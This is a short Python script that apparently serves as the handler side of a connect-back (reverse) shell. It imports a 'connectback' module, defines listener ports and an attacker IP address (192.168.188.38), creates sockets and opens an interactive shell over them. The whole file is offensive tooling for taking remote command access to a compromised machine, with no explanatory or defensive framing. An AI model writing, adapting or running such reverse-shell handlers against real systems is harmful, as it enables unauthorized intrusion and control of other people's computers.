import connectback

NC_PORT = 1233
STDOUT_PORT = 1234
STDIN_PORT = 1235
my_ip = "192.168.188.38"

sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)
connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)
